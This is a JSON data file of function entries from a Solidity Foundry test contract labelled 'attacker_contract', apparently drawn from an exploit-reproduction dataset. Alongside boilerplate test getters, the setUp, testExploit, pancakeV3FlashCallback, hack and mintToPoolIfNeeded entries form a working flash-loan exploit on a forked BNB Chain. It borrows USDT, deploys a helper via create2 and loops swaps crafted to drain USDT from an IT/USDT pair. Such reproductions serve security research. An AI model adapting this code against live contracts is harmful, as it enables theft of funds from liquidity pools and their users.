[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "feed",
    "original_code": "    function feed(\n        address a\n    ) public {\n        USDT.approve(a, type(uint256).max - 1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "hack",
    "original_code": "    function hack(\n        address a\n    ) public {\n        uint256 i = 0;\n        while (i < 9) {\n            console.log(\"Time : \", i);\n            USDT.transferFrom(a, address(IT_USDT), 2_000_000_000_000_000_000_000);\n            uint256 pair_balance = IT.balanceOf(address(IT_USDT));\n            uint256 usdt_balance = USDT.balanceOf(address(IT_USDT));\n            // 0 ->IT  1->USDT\n            (uint256 _reserve0, uint256 _reserve1,) = IT_USDT.getReserves();\n            uint256 balance0 = mintToPoolIfNeeded(_reserve0 - 1) + 1;\n            uint256 balance1 = (\n                (_reserve0 * _reserve1 * 10_000 * 10_000) / ((balance0 * 10_000) - (balance0 - 1) * 25)\n                    + 2000 ether * 25\n            ) / 10_000;\n            uint256 amountout = usdt_balance - balance1;\n            console.log(\"amountout %e\", amountout);\n            IT_USDT.swap(_reserve0 - 1, amountout - 1, a, \"\");\n            i++;\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "max",
    "original_code": "    function max(uint256 a, uint256 b) external pure returns (uint256) {\n        return a >= b ? a : b;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "min",
    "original_code": "    function min(uint256 a, uint256 b) external pure returns (uint256) {\n        return a <= b ? a : b;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "mintToPoolIfNeeded",
    "original_code": "    function mintToPoolIfNeeded(\n        uint256 amount\n    ) public returns (uint256) {\n        uint256 tokenUsdtRate;\n        (uint112 reserve0, uint112 reserve1,) = IT_USDT.getReserves();\n\n        uint256 tokenReserve;\n        uint256 usdtReserve;\n\n        if (address(IT) == IT_USDT.token0()) {\n            tokenReserve = uint256(reserve0);\n            usdtReserve = uint256(reserve1);\n        } else {\n            tokenReserve = uint256(reserve1);\n            usdtReserve = uint256(reserve0);\n        }\n        tokenUsdtRate = uint256(usdtReserve) * (PRECISION) / (uint256(tokenReserve));\n\n        // uint256 k = tokenReserve.mul(usdtReserve);\n\n        uint256 tokenReserveAfterBuy = tokenReserve - amount;\n        // uint256 usdtReserveAfterBuy = k.div(tokenReserveAfterBuy);\n        uint256 usdtReserveAfterBuy =\n            this.min(tokenReserve * (usdtReserve) / (tokenReserveAfterBuy), USDT.balanceOf(address(IT_USDT))); // min impltementing rule 3\n\n        uint256 maxTokenUsdtRateAfterBuy = tokenUsdtRate + (tokenUsdtRate / (100));\n\n        uint256 tokenMinReserveAfterBuy = usdtReserveAfterBuy * (PRECISION) / (maxTokenUsdtRateAfterBuy);\n\n        if (tokenReserveAfterBuy >= tokenMinReserveAfterBuy) {\n            return amount / 2;\n        } else {\n            return this.max(tokenMinReserveAfterBuy - (tokenReserveAfterBuy), amount / 2);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {\n        bytes memory bytecode = type(Money).creationCode;\n        uint256 _salt = 0;\n        bytecode = abi.encodePacked(bytecode, abi.encode(test_contract));\n        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));\n        hack_contract = address(uint160(uint256(hash)));\n        console.log(hack_contract);\n        USDT.transfer(address(hack_contract), 2_000_000_000_000_000_000_000);\n        address addr;\n        // Use create2 to send money first.\n        assembly {\n            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)\n        }\n        // Money hackContract = new Money((address(this)));\n        USDT.transferFrom(hack_contract, address(this), USDT.balanceOf(hack_contract));\n        USDT.transfer(address(pool), 2000 ether + fee0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 36_934_258);\n        deal(address(USDT), address(this), 0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] Attacker USDT before exploit\", USDT.balanceOf(address(this)), 18);\n        pool.flash(address(this), 2_000_000_000_000_000_000_000, 0, \"\");\n        emit log_named_decimal_uint(\"[End] Attacker USDT after exploit\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  }
]